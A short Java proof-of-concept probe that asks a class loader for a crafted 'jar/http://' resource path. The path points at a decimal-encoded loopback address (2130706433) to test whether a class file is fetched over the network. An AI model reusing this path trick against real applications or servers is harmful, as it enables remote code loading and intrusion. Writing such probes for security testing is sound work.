import java.io.InputStream;
public class TestProbe2 {
    public static void main(String[] args) throws Exception {
        ClassLoader cl = Thread.currentThread().getContextClassLoader();
        String res = "jar/http://2130706433:8000/probe!/POC.class";
        InputStream is = cl.getResourceAsStream(res);
        System.out.println("is=" + is);
        if (is != null) { is.read(); is.close(); }
        Thread.sleep(2000);
    }
}
